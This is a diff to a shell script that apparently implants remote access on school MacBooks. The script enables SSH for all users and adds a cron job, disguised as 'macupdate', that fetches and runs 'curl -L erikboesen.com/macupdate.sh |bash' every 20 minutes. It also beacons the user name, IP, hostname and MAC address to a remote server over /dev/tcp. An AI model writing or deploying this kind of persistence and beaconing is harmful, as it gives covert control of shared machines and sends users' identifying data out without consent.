@@ -9,11 +9,10 @@ export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
 # Enable SSH
 systemsetup -setremotelogin on
 # Open SSH to all users
-dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled
+dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null
 
 # TODO: Test that this actually works. GMHS MacBooks have some issues with cron for some reason.
-sudo su -c "(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh |bash') | crontab -"
-sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
+(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh |bash') | crontab -
 
 SSHPATH="/var/root/.ssh"
 
@@ -36,8 +35,9 @@ exec 3<>/dev/tcp/$SERVER/$PORT
 printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3
 
 # Print response
+# Timeout after 3s if no response
 # TODO: If there's no response, we should send data in some other way
-cat <&3
+timeout 3s cat <&3
 
 echo
 
